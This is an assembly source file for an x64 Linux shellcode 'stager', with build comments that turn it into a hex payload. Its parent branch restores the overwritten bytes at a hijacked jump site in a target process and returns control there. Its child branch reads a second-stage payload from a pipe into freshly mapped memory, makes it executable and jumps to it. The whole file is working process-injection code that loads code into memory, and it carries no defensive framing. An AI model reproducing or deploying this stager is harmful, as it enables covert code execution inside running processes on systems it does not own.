# x64 stager
# as a.s -o a.o
# objcopy -O binary --only-section=.text a.o a
# xxd -ps a | tr -d '\n' ; echo

.global _start
.intel_syntax noprefix

_start:
	push rax
	push rdi
	push rsi
	push rdx
	push r10

	lea rdi, [rsp - 8]
	mov eax, 0x16 # SYS_pipe
	syscall

	mov eax, 0x39 # SYS_fork
	syscall
	test eax, eax
	jz load

	mov  edi, [rsp - 8] # read end of the pipe
	mov  eax, 3   # SYS_close
	syscall

	# Restore the original code at our jmp and return to it
	mov edi, [rip + data + data.fd]
	lea rsi, [rip + data + data.original]
	mov rdx, 12
	mov r10, [rip + data + data.retaddr]
	mov eax, 0x12 # SYS_pwrite64
	syscall

	mov esi, edi
	mov edi, [rsp - 4]
	mov eax, 0x21 # SYS_dup2
	syscall

	mov  eax, 3   # SYS_close
	syscall

	pop r10
	pop rdx
	pop rsi
	pop rdi
	pop rax
	jmp [rip + data + data.retaddr]

load: # Load memexecd in the child
	mov rdi, 0
	mov rsi, 0
	mov rax, 0x6d # SYS_setpgid
	syscall

	mov  edi, [rsp - 4] # write end of the pipe
	mov  eax, 3   # SYS_close
	syscall

	mov edi, [rsp - 8]
	xor rsi, rsi
	mov eax, 0x21 # SYS_dup2
	syscall

	mov  eax, 3   # SYS_close
	syscall

	mov  edi, [rip + data + data.fd]
	mov  eax, 3   # SYS_close
	syscall

	mov r9d , 0x0
	mov r8d , 0xffffffff
	mov r10d, 0x22
	mov edx , 0x3
	mov esi , 0x1000
	mov edi , 0x0
	mov eax , 0x9 # SYS_mmap
	syscall

	mov edx , esi
	mov rsi , rax
	xor eax , eax # SYS_read
	mov edi , eax
	syscall

	mov rdi , rsi
	mov esi , edx
	mov edx , 0x5
	mov  ax , 0xa # SYS_mprotect
	syscall
	jmp rdi

.align 4
data:

.struct 0
data.retaddr  : .space 8
data.original : .space 12
data.fd       : .space 4
